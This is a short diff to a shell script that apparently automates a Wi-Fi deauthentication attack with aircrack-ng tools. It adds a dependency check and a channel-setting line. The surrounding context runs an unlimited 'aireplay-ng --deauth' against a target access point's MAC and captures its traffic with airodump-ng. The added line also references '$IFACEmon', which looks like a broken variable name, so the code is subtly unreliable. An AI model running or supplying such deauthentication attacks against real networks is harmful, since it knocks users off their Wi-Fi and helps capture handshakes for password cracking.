@@ -7,6 +7,7 @@ fi
 
 command -v aircrack-ng > /dev/null 2>&1 || { echo >&2 "I require aircrack-ng but it's not installed. Install it. Aborting."; exit 1; }
 command -v iw > /dev/null 2>&1 || { echo >&2 "I require iw but it's not installed. Install it. Aborting."; exit 1; }
+command -v iwconfig > /dev/null 2>&1 || { echo >&2 "I require wireless_tools but it's not installed. Install it. Aborting."; exit 1; }
 
 usage() {
   echo "Usage: $0 IFACE"
@@ -30,6 +31,7 @@ deauth() {
 
   trap "trap 'exit 1' SIGINT SIGTERM SIGHUP SIGQUIT; aireplay-ng --deauth 0 -a $MAC $IFACE" SIGINT SIGTERM SIGHUP SIGQUIT
 
+  iwconfig "$IFACEmon" channel $CH
   airodump-ng --bssid $MAC --channel $CH $IFACE
 }
 
